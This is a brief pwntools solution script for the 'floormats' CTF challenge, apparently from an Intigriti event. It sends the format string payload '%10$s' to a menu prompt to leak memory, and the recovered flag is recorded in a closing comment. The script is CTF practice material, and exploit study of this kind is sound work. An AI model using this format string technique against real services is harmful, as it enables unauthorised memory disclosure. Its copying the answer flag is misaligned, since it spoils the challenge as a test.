#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./floormats")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("floormats.ctf.intigriti.io", 1337)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b'choice:', b'6')
	r.sendlineafter(b'address', b'%10$s')

	r.interactive()


if __name__ == "__main__":
	main()

# INTIGRITI{50_7h475_why_7h3y_w4rn_4b0u7_pr1n7f}
